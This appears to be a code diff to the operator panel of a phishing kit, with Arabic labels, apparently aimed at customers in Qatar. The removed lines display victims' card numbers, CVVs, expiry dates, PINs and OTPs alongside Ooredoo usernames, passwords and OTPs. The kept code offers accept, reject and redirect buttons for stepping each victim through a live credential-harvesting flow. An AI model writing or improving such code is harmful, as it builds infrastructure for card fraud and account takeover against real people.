@@ -559,65 +559,52 @@ function openPop(ref){
     createdAt: 'تاريخ الإنشاء', updatedAt: 'تاريخ التحديث', pay: 'بيانات الدفع', ooredoo: 'بيانات أوريدو'
   };
 
-  // الحقول التي تُعرض بتنسيق خاص
+  // الحقول التي تُعرض بتنسيق خاص أو تُتجاهل
   const specialFields = ['pay', 'ooredoo', 'createdAt', 'updatedAt', 'visitId', 'ref'];
 
-  // بناء صفوف الجدول من جميع الخصائص
+  // بناء صفوف الجدول من جميع الخصائص (فقط الحقول المملوءة)
   let fieldsHTML = '<div class="dgrid">';
   for (const [key, value] of Object.entries(o)) {
-    if (specialFields.includes(key) || key.startsWith('qic')) continue;
+    // تجاهل الحقول الفارغة والحقول الخاصة والبيانات الداخلية
+    if (!value || specialFields.includes(key) || key.startsWith('qic')) continue;
+    if (value === '—' || value === '' || value === null || value === undefined) continue;
 
     let label = fieldLabels[key] || key;
     let displayValue = '—';
 
-    if (value !== null && value !== undefined && value !== '') {
-      if (key === 'p') displayValue = fmtPhone(value);
-      else if (key === 'id') displayValue = fmtEid(value);
-      else if (key === 'ts' || key === 'createdAt' || key === 'updatedAt') displayValue = fmtDate(value);
-      else if (key === 'status') displayValue = statusText(value);
-      else if (key === 'g') displayValue = value === 'female' ? 'أنثى' : 'ذكر';
-      else if (key === 'st') displayValue = value === 'resident' ? 'مقيم' : 'مواطن';
-      else if (key === 'em') displayValue = emName(value);
-      else if (key === 'a') displayValue = areaName(o.em, value);
-      else if (key === 'card') {
-        const c = plans.find(p => p.cls === value);
-        displayValue = c ? c.ar : value;
-      }
-      else if (key === 'watch') {
-        const w = WATCHES.find(w => w.id === value);
-        displayValue = w ? w.ar : value;
-      }
-      else displayValue = esc(String(value));
+    // معالجة خاصة لكل نوع حقل
+    if (key === 'p') displayValue = fmtPhone(value);
+    else if (key === 'id') displayValue = fmtEid(value);
+    else if (key === 'ts' || key === 'createdAt' || key === 'updatedAt') displayValue = fmtDate(value);
+    else if (key === 'status') displayValue = statusText(value);
+    else if (key === 'g') displayValue = value === 'female' ? 'أنثى' : 'ذكر';
+    else if (key === 'st') displayValue = value === 'resident' ? 'مقيم' : 'مواطن';
+    else if (key === 'em') displayValue = emName(value) || value;
+    else if (key === 'a') displayValue = areaName(o.em, value) || value;
+    else if (key === 'card') {
+      const c = plans.find(p => p.cls === value);
+      displayValue = c ? c.ar : value;
     }
+    else if (key === 'watch') {
+      const w = WATCHES.find(w => w.id === value);
+      displayValue = w ? w.ar : value;
+    }
+    else if (typeof value === 'object') continue; // تجاهل الكائنات المعقدة
+    else displayValue = esc(String(value));
+
+    if (!displayValue || displayValue === '—') continue; // تجاهل القيم الفارغة بعد المعالجة
 
     const isLtr = ['p', 'id', 'ts', 'createdAt', 'updatedAt', 'e'].includes(key);
     fieldsHTML += `<div class="drow"><span class="k">${label}</span><span class="v" ${isLtr ? 'style="direction:ltr"' : ''}>${displayValue}</span></div>`;
   }
   fieldsHTML += '</div>';
 
-  $("popBody").innerHTML = fieldsHTML
- ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
-<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(payValue(o.pay.cardName))}</span></div>
-<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.cardNumber || o.pay.number))}</span></div>
-<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.cvv))}</span></div>
-<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.exp || o.pay.expiry))}</span></div>
-<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.otp || o.pay.code))}</span></div>
-<div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.pin))}</span></div>
-</div></div>` : ""}
-${o.ooredoo ? `
-<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
-    <div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredoo.username)}</span></div>
-    <div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr">${esc(o.ooredoo.password)}</span></div>
-    <div class="drow"><span class="k">رمز التحقق (OTP)</span><span class="v" style="direction:ltr">${esc(o.ooredoo.otp)}</span></div>
-</div></div>
-` : ""}
-    ${o.status === "awaiting" ? `<div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
-      <div style="flex:1 0 100%; margin-bottom:6px; font-weight:800">الخطوة الحالية: ${stepName(o.step)}</div>
+  $("popBody").innerHTML = fieldsHTML + `
+    <div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
+      ${o.status === "awaiting" ? `<div style="flex:1 0 100%; margin-bottom:6px; font-weight:800">الخطوة الحالية: ${stepName(o.step)}</div>
       <button class="rbtn accept" data-accept="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
-      <button class="rbtn reject" data-reject="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
-    </div>` : ""}
-    <div class="dactions">
-      <button class="rbtn redir" data-redir="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> إعادة التوجيه لصفحة الطلب</button>
+      <button class="rbtn reject" data-reject="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>` : ""}
+      <button class="rbtn redir" data-redir="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> إعادة التوجيه</button>
       <button class="rbtn" id="popClose2">إغلاق</button>
     </div>`;
   $("pop").classList.add("open"); document.body.classList.add("pop-open");
